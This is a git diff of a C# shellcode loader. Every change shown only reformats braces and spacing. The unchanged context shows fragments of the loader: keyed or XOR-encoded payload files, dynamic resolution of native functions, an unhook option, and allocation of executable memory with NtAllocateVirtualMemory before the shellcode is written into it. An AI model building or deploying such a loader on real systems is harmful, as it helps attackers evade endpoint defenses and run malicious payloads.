@@ -175,7 +175,8 @@ namespace ShellcodeLoader
                 {
                     IntPtr funcPtr = DynamicInvoke.Generic.GetExportAddress(hModule, function);
                     funcAddresses.Add(function, funcPtr);
-                } catch (MissingMethodException)
+                }
+                catch (MissingMethodException)
                 {
                     Console.WriteLine("[-] Couldn't locate the address for {0}!", function);
                 }
@@ -278,7 +279,8 @@ namespace ShellcodeLoader
                     return null;
                 }
                 return new string[] { lines[0].Substring(4), lines[1] };
-            } catch (Exception e)
+            }
+            catch (Exception e)
             {
                 Console.Error.WriteLine("Cannot parse shellcode file.");
                 Console.Error.WriteLine(e.Message);
@@ -289,9 +291,9 @@ namespace ShellcodeLoader
         public static string GetKey(string mode, string password = null)
         {
             StringBuilder keybuilder = new StringBuilder();
-            foreach(char c in mode)
+            foreach (char c in mode)
             {
-                KeyingMode m = (KeyingMode) int.Parse(c.ToString());
+                KeyingMode m = (KeyingMode)int.Parse(c.ToString());
                 switch (m)
                 {
                     case KeyingMode.KEYING_NONE:
@@ -309,7 +311,8 @@ namespace ShellcodeLoader
                         if (password != null)
                         {
                             keybuilder.Append(password);
-                        } else
+                        }
+                        else
                         {
                             Console.Write("Password: ");
                             keybuilder.Append(Console.ReadLine().Trim(new[] { '\n', '\r', ' ', '\t' }));
@@ -338,7 +341,7 @@ namespace ShellcodeLoader
             bool unhook = false;
             string password = null;
 
-            for (int i=0; i<args.Length; i++)
+            for (int i = 0; i < args.Length; i++)
             {
                 switch (args[i])
                 {
@@ -346,19 +349,20 @@ namespace ShellcodeLoader
                         unhook = true;
                         break;
                     case "-p":
-                        if (i+1>= args.Length)
+                        if (i + 1 >= args.Length)
                         {
                             usage();
                             return -1;
                         }
-                        password = args[i+1];
+                        password = args[i + 1];
                         i++;
                         break;
                     default:
                         if (filename == null)
                         {
                             filename = args[i];
-                        } else
+                        }
+                        else
                         {
                             usage();
                             return -1;
@@ -372,7 +376,8 @@ namespace ShellcodeLoader
                 if (File.Exists("shellcode.bin"))
                 {
                     filename = "shellcode.bin";
-                } else
+                }
+                else
                 {
                     Console.Error.WriteLine("Please specify an input filename");
                     usage();
@@ -399,7 +404,8 @@ namespace ShellcodeLoader
                 key = GetKey(content[0], password);
                 strpayload = content[1];
                 payloadSize = Convert.ToUInt32(strpayload.Length / 2);
-            } else
+            }
+            else
             {
                 Console.WriteLine("Detected standard file");
                 binpayload = LoadDonutFile(filename);
@@ -425,7 +431,8 @@ namespace ShellcodeLoader
             if (key == null)
             {
                 Console.WriteLine("Shellcode not keyed.");
-            } else
+            }
+            else
             {
                 Console.WriteLine("Generated XOR key: " + key);
             }
@@ -437,7 +444,7 @@ namespace ShellcodeLoader
                 (uint)0x3000,
                 (uint)0x40
             };
-           
+
             IntPtr addr = IntPtr.Zero;
             IntPtr region_size = (IntPtr)payloadSize;
             DynamicInvoke.Native.NtAllocateVirtualMemory((IntPtr)(-1), ref addr, IntPtr.Zero, ref region_size, (uint)0x3000, (uint)0x40);
@@ -446,7 +453,8 @@ namespace ShellcodeLoader
             {
                 Console.Error.WriteLine("Allocation failed :(");
                 return 255;
-            } else
+            }
+            else
             {
                 Console.WriteLine("Allocation successful!");
             }
@@ -455,7 +463,8 @@ namespace ShellcodeLoader
             if (LOLZFormat)
             {
                 writeHexPayloadToMem(strpayload, ref addr);
-            } else
+            }
+            else
             {
                 writeBinPayloadToMem(binpayload, ref addr);
             }
